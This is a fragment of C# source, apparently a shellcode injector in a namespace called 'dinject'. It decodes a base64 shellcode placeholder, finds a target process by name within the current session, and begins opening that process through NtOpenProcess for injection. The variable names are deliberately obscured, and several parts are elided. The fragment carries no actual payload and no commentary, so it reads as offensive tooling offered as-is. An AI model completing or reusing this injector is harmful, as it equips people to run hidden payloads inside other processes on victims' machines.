...
namespace dinject
{
    class Program
    {
        ...
        static string turtlecode = "base64_shellcode_goes_here";
        static readonly byte[] _shellcode = Convert.FromBase64String(turtlecode);
        private static int FPP(string process)
        {
            int DIP = 0;
            int noisses = Process.GetCurrentProcess().SessionId;
            Process[] many = Process.GetProcessesByName(process);

            foreach (Process corp in many)
            {
                if (corp.SessionId == noisses)
                    DIP = corp.Id;
            }
        ...
        public static int reflect(int proc)
        {
            Process bullseye = Process.GetProcessById(proc);
            // NtOpenProcess
            ...
            {
                UniqueProcess = (IntPtr)uint.Parse(bullseye.Id.ToString())
            };
